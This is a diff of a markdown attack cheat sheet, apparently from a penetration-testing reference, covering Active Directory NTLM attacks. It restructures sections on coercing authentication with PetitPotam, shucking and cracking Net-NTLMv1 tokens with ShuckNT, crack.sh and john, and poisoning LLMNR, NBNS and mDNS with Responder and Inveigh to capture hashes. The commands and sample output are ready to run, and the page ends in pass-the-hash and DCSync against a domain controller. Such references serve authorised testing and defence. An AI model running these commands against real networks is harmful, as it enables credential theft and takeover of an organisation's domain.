@@ -15,7 +15,7 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
 * **Level 4** - Domain controllers refuse LM responses. Clients use NTLM authentication, and use NTLM 2 session security if the server supports it; domain controllers refuse LM authentication (that is, they accept NTLM and NTLM 2).
 * **Level 5** - Domain controllers refuse LM and NTLM responses (accept only NTLM 2). Clients use NTLM 2 authentication, use NTLM 2 session security if the server supports it; domain controllers refuse NTLM and LM authentication (they accept only NTLM 2).A client computer can only use one protocol in talking to all servers. You cannot configure it, for example, to use NTLM v2 to connect to Windows 2000-based servers and then to use NTLM to connect to other servers. This is by design.
 
-## Capturing and cracking Net-NTLMv1/NTLMv1 hashes/tokens
+## Capturing Net-NTLMv1/NTLMv1 hashes
 
 > Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication. They are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys.
 
@@ -47,20 +47,22 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
     PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
     ```
 
-* If you got some `NetNTLMv1 tokens`, you can try to **shuck** them online via [Shuck.Sh](https://shuck.sh/) or locally/on-premise via [ShuckNT](https://github.com/yanncam/ShuckNT/) to get NT-hashes corresponding from [HIBP database](https://haveibeenpwned.com/Passwords). If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash ([pass-the-hash](./hash-pass-the-hash.md) ready) instantly. The [shucking process](https://www.youtube.com/watch?v=OQD3qDYMyYQ&ab_channel=PasswordVillage) works for any NetNTLMv1 with or without ESS/SSP (challenge != `1122334455667788`) but mainly for user account (plaintext previsouly leaked).
+## Cracking Net-NTLMv1/NTLMv1 hashes
+
+* If you got some `NetNTLMv1 tokens`, you can try to **shuck** them online via [shuck.sh](https://shuck.sh/) or locally/on-premise via [ShuckNT](https://github.com/yanncam/ShuckNT/) to get NT-hashes corresponding from [HIBP database](https://haveibeenpwned.com/Passwords). If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash ([pass-the-hash](./hash-pass-the-hash.md) ready) instantly. The [shucking process](https://www.youtube.com/watch?v=OQD3qDYMyYQ) works for any NetNTLMv1 with or without ESS/SSP (challenge != `1122334455667788`) but mainly for user account (plaintext previsouly leaked).
 
     ```ps1
     # Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php
     # Or shuck them on-premise via ShuckNT script:
     $ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin
 
- [...]
- 10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.
- [INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788
-         [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B
+    [...]
+    10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.
+    [INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788
+    [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B
     ```
 
-* If you got some `NetNTLMv1 tokens`, you can also try to crack them via [Crack.Sh](https://crack.sh/) (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on [Crack.Sh](https://crack.sh/netntlm/). The Converter of [Shuck.Sh](https://shuck.sh/) can be used to convert format easily.
+* If you got some `NetNTLMv1 tokens`, you can also try to crack them via [crack.sh](https://crack.sh/) (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on [crack.sh](https://crack.sh/netntlm/). The converter of [shuck.sh](https://shuck.sh/) can be used to format easily.
 
     ```ps1
     # When there is no-ESS/SSP and the challenge is set to 1122334455667788, it's free (0$):
@@ -72,7 +74,7 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
     $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E
     ```
 
-* Finaly, if no [Shuck.Sh](https://shuck.sh/) nor [Crack.Sh](https://crack.sh/) can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper
+* Finaly, if no [shuck.sh](https://shuck.sh/) nor [crack.sh](https://crack.sh/) can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper. Use [Net-NTLMv1 Rainbow Tables](https://tables.blurbdust.pw/) to speed up the plain text recovery.
 
     ```ps1
     john --format=netntlm hash.txt
@@ -83,13 +85,13 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
 
 * Now you can DCSync using the Pass-The-Hash with the DC machine account
 
-:warning: NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= `1122334455667788`, so chargeable on [Crack.Sh](https://crack.sh/)).
+:warning: NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= `1122334455667788`, so chargeable on [crack.sh](https://crack.sh/)).
 
 :warning: NetNTLMv1 format is `login::domain:lmresp:ntresp:clientChall`. If the `lmresp` contains a **0's-padding** this means that the token is protected by **ESS/SSP**.
 
-:warning: NetNTLMv1 final challenge is the Responder's challenge itself (`1122334455667788`) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the [Shuck.Sh Generator](https://shuck.sh/generator.php) and detailed in [MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it).
+:warning: NetNTLMv1 final challenge is the Responder's challenge itself (`1122334455667788`) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the [shuck.sh Generator](https://shuck.sh/generator.php) and detailed in [MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it).
 
-:warning: If you get some tokens from other tools ([hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe) or [chapcrack](https://github.com/moxie0/chapcrack)) in other formats, like tokens starting with the prefix `$MSCHAPv2$`, `$NETNTLM$` or `$99$`, they correspond to a classic NetNTLMv1 and can be converted from one format to another [here](https://shuck.sh/converter.php).
+:warning: If you get some tokens from other tools ([OpenSecurityResearch/hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe) or [moxie0/chapcrack](https://github.com/moxie0/chapcrack)) in other formats, like tokens starting with the prefix `$MSCHAPv2$`, `$NETNTLM$` or `$99$`, they correspond to a classic NetNTLMv1 and can be converted from one format to another [here](https://shuck.sh/converter.php).
 
 **Mitigations**:
 
@@ -99,16 +101,23 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
 
 If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.
 
-```powershell
-# https://github.com/lgandx/Responder
-$ sudo ./Responder.py -I eth0 -wfrd -P -v
+* [lgandx/Responder](https://github.com/lgandx/Responder)
 
-# https://github.com/Kevin-Robertson/InveighZero
-PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
+    ```powershell
+    sudo ./Responder.py -I eth0 -wfrd -P -v
+    ```
 
-# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
-PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
-```
+* [Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+    ```powershell
+    .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
+    ```
+
+* [EmpireProject/Invoke-Inveigh.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)
+
+    ```powershell
+    Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+    ```
 
 Crack the hashes with Hashcat / John The Ripper
 
